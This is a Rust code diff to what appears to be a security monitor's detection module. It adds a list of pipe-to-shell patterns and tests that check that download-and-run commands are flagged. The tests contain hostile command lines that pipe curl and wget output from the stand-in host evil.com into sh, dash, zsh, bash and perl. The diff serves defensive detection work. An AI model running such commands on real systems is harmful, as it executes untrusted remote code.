@@ -32,7 +32,6 @@ pub enum BehaviorCategory {
     Reconnaissance,
     SideChannel,
     FinancialTheft,
-    #[allow(dead_code)]
     SocialEngineering,
     #[allow(dead_code)]
     BarnacleMatch,
@@ -657,6 +656,17 @@ const SOCIAL_ENGINEERING_PATTERNS: &[(&str, &str, Severity)] = &[
     ("npm install --registry", "npm install from non-default registry", Severity::Warning),
 ];
 
+/// Pipe-to-shell patterns for detecting command injection via piping to interpreters.
+/// Covers standard shells, full paths, alternate shells, and interpreter pipes.
+const PIPE_TO_SHELL_PATTERNS: &[&str] = &[
+    "| sh", "|sh", "| bash", "|bash", "| sudo", "|sudo",
+    "| /bin/sh", "| /usr/bin/sh", "| /bin/bash", "| /usr/bin/bash",
+    "| dash", "|dash", "| /bin/dash", "| /usr/bin/dash",
+    "| zsh", "|zsh", "| ksh", "|ksh",
+    "| /bin/zsh", "| /bin/ksh",
+    "| perl", "| python", "| ruby", "| node",
+];
+
 /// Check a command string for social engineering patterns.
 ///
 /// Returns the first matching pattern's (description, severity), or None.
@@ -667,12 +677,7 @@ pub fn check_social_engineering(cmd: &str) -> Option<(&'static str, Severity)> {
     let cmd_lower = cmd.to_lowercase();
 
     // First check: curl/wget pipe-to-shell (Critical)
-    let has_pipe_to_shell = cmd_lower.contains("| sh")
-        || cmd_lower.contains("| bash")
-        || cmd_lower.contains("| sudo")
-        || cmd_lower.contains("|sh")
-        || cmd_lower.contains("|bash")
-        || cmd_lower.contains("|sudo");
+    let has_pipe_to_shell = PIPE_TO_SHELL_PATTERNS.iter().any(|p| cmd_lower.contains(p));
 
     if has_pipe_to_shell {
         if cmd_lower.contains("curl ") || cmd_lower.contains("curl\t") {
@@ -1055,7 +1060,7 @@ pub fn classify_behavior(event: &ParsedEvent) -> Option<(BehaviorCategory, Sever
             for pattern in PRELOAD_BYPASS_PATTERNS {
                 if cmd.contains(pattern) {
                     // Don't flag our own legitimate preload operations
-                    if !cmd.contains("clawtower") && !cmd.contains("clawtower") {
+                    if !cmd.contains("clawtower") && !cmd.contains("libclawtower") {
                         // Don't flag normal compiler/linker invocations
                         if ["ld", "collect2", "cc1", "cc1plus", "gcc", "g++", "rustc", "cc"].contains(&binary) {
                             // Normal compilation — linker uses -dynamic-linker /lib/ld-linux-*.so.1
@@ -4109,6 +4114,38 @@ mod tests {
     }
 
     // ───────────────────── Social Engineering Detection ──────────────────────
+
+    // --- Expanded pipe-to-shell detection (M8) ---
+
+    #[test]
+    fn test_pipe_to_bin_sh_detected() {
+        let result = check_social_engineering("curl https://evil.com/payload | /bin/sh");
+        assert!(result.is_some(), "pipe to /bin/sh should be detected");
+    }
+
+    #[test]
+    fn test_pipe_to_dash_detected() {
+        let result = check_social_engineering("wget -qO- evil.com/x | dash");
+        assert!(result.is_some(), "pipe to dash should be detected");
+    }
+
+    #[test]
+    fn test_pipe_to_perl_detected() {
+        let result = check_social_engineering("curl evil.com/x | perl -e");
+        assert!(result.is_some(), "pipe to perl should be detected");
+    }
+
+    #[test]
+    fn test_pipe_to_zsh_detected() {
+        let result = check_social_engineering("wget evil.com/x | zsh");
+        assert!(result.is_some(), "pipe to zsh should be detected");
+    }
+
+    #[test]
+    fn test_pipe_to_usr_bin_bash_detected() {
+        let result = check_social_engineering("curl evil.com/x | /usr/bin/bash");
+        assert!(result.is_some(), "pipe to /usr/bin/bash should be detected");
+    }
 
     #[test]
     fn test_social_engineering_curl_pipe_shell() {
